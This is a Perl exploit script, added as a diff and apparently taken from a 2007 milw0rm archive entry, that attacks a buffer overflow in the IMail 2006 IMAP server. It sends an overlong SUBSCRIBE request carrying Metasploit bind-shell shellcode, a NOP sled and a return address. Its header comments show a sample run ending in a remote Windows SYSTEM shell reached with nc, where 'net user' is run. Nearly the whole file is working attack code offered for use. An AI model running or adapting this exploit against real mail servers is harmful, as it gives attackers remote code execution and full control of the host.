@@ -1,0 +1,147 @@
+#!/use/bin/perl
+
+# Test on Imail 2006(9.10), imap4d32.exe(6.8.8.1), windows 2003 Chinese SP1
+# Code by yunshu, our team: www.ph4nt0m.org  Mail list: http://list.ph4nt0m.org
+
+#F:\>perl imail_SUBSCRIBE.pl 192.168.1.2 test_user test_pass
+#* OK IMAP4 Server (IMail 9.10)
+#0 OK LOGIN completed
+#* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+#* 0 EXISTS
+#* 0 RECENT
+#* OK [UIDVALIDITY 1185270594] UIDs valid
+#* OK [UIDNEXT 485270595] Predicted next UID
+#2 OK [READ-WRITE] SELECT completed
+#3 OK SUBSCRIBE completed
+#Trying..
+#Bingle!Maybe get it!
+#You can try to telnet 22 port, do you have nc?
+
+
+#D:\Microsoft Visual Studio 8\VC>nc -vv 192.168.1.2 22
+#192.168.1.2: inverse host lookup failed: h_errno 11004: NO_DATA
+#(UNKNOWN) [192.168.1.2] 22 (?) open
+#Microsoft Windows [.. 5.2.3790]
+#(C) .... 1985-2003 Microsoft Corp.
+
+#C:\WINDOWS\system32>net user
+#net user
+
+#\\ .....
+
+#-------------------------------------------------------------------------------
+#Administrator            ASPNET                   Guest
+#IUSR_WIN2K3              IWAM_WIN2K3              SUPPORT_388945a0
+#..................
+
+
+#C:\WINDOWS\system32>
+
+
+use strict;
+use warnings;
+use IO::Socket;
+
+if( @ARGV != 3 )
+{
+	my $banner = qq{
+Imail subscribe exploit, Test on Imail 2006(9.10),windows 2003 Chinese SP1
+You must have a account to login the imap server, good luck!
+Code by yunshu, our team www.ph4nt0m.org, enjoin this exp~~
+					 
+imail_subscribe.pl  <host>   <username>   <password>
+};
+
+	print $banner."\n";
+	
+	exit( -1 );
+}
+
+my $host = $ARGV[0];
+my $user = $ARGV[1];
+my $pass = $ARGV[2];
+
+# win32_bind -  EXITFUNC=thread LPORT=22 Size=344 Encoder=Pex http://metasploit.com
+my $shellcode =
+"\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x41".
+"\xd1\xfd\xbc\x83\xeb\xfc\xe2\xf4\xbd\xbb\x16\xf1\xa9\x28\x02\x43".
+"\xbe\xb1\x76\xd0\x65\xf5\x76\xf9\x7d\x5a\x81\xb9\x39\xd0\x12\x37".
+"\x0e\xc9\x76\xe3\x61\xd0\x16\xf5\xca\xe5\x76\xbd\xaf\xe0\x3d\x25".
+"\xed\x55\x3d\xc8\x46\x10\x37\xb1\x40\x13\x16\x48\x7a\x85\xd9\x94".
+"\x34\x34\x76\xe3\x65\xd0\x16\xda\xca\xdd\xb6\x37\x1e\xcd\xfc\x57".
+"\x42\xfd\x76\x35\x2d\xf5\xe1\xdd\x82\xe0\x26\xd8\xca\x92\xcd\x37".
+"\x01\xdd\x76\xcc\x5d\x7c\x76\xfc\x49\x8f\x95\x32\x0f\xdf\x11\xec".
+"\xbe\x07\x9b\xef\x27\xb9\xce\x8e\x29\xa6\x8e\x8e\x1e\x85\x02\x6c".
+"\x29\x1a\x10\x40\x7a\x81\x02\x6a\x1e\x58\x18\xda\xc0\x3c\xf5\xbe".
+"\x14\xbb\xff\x43\x91\xb9\x24\xb5\xb4\x7c\xaa\x43\x97\x82\xae\xef".
+"\x12\x82\xbe\xef\x02\x82\x02\x6c\x27\xb9\xfd\xaa\x27\x82\x74\x5d".
+"\xd4\xb9\x59\xa6\x31\x16\xaa\x43\x97\xbb\xed\xed\x14\x2e\x2d\xd4".
+"\xe5\x7c\xd3\x55\x16\x2e\x2b\xef\x14\x2e\x2d\xd4\xa4\x98\x7b\xf5".
+"\x16\x2e\x2b\xec\x15\x85\xa8\x43\x91\x42\x95\x5b\x38\x17\x84\xeb".
+"\xbe\x07\xa8\x43\x91\xb7\x97\xd8\x27\xb9\x9e\xd1\xc8\x34\x97\xec".
+"\x18\xf8\x31\x35\xa6\xbb\xb9\x35\xa3\xe0\x3d\x4f\xeb\x2f\xbf\x91".
+"\xbf\x93\xd1\x2f\xcc\xab\xc5\x17\xea\x7a\x95\xce\xbf\x62\xeb\x43".
+"\x34\x95\x02\x6a\x1a\x86\xaf\xed\x10\x80\x97\xbd\x10\x80\xa8\xed".
+"\xbe\x01\x95\x11\x98\xd4\x33\xef\xbe\x07\x97\x43\xbe\xe6\x02\x6c".
+"\xca\x86\x01\x3f\x85\xb5\x02\x6a\x13\x2e\x2d\xd4\xae\x1f\x1d\xdc".
+"\x12\x2e\x2b\x43\x91\xd1\xfd\xbc";
+
+my $sock = IO::Socket::INET->new( PeerHost=>$host, PeerPort=>"143", proto=>"tcp" ) || die "Connect error.\n";
+
+my $res = <$sock>;
+print $res;
+if( $res !~ /OK/ )
+{
+	exit( -1 );
+}
+
+my $opcode = "\x60\x1A\x9C\x76";
+#my $opcode = "\x61\x62\x63\x64";
+
+my $num = 264991;
+
+my $nop = "#IMAILPUB" . "\x90" x ( $num - length($shellcode) ).$shellcode."\x90\x90\xeb\x06".$opcode."\x90\x90\x90\x90"."\xE9\x44\xfd\xff\xff"."\x90" x 400;
+
+# login
+print $sock "0 LOGIN $user $pass\r\n";
+$res = <$sock>;
+if( ! defined($res) )
+{
+	exit(-1);
+}
+
+print $res;
+if( $res !~ /OK/ )
+{
+	exit(-1);
+}
+
+print $sock "2 SELECT INBOX\r\n";
+while( <$sock> )
+{
+	print $_;
+	if( $_ =~ /2 OK/ || $_ =~ /2 BAD/ )
+	{
+		last;
+	}
+}
+
+print $sock "3 SUBSCRIBE \"$nop\"\r\n";
+$res = <$sock>;
+if( ! defined($res) )
+{
+	exit(-1);
+}
+print $res;
+
+print "Trying..\n";
+
+sleep( 15 );
+print "Bingle! Maybe get it!\nYou can try to telnet 22 port, do you have nc?\n";
+
+print $sock "4 LOGOUT\r\n";
+print <$sock>;
+
+$sock->close();
+
+# milw0rm.com [2007-07-26]
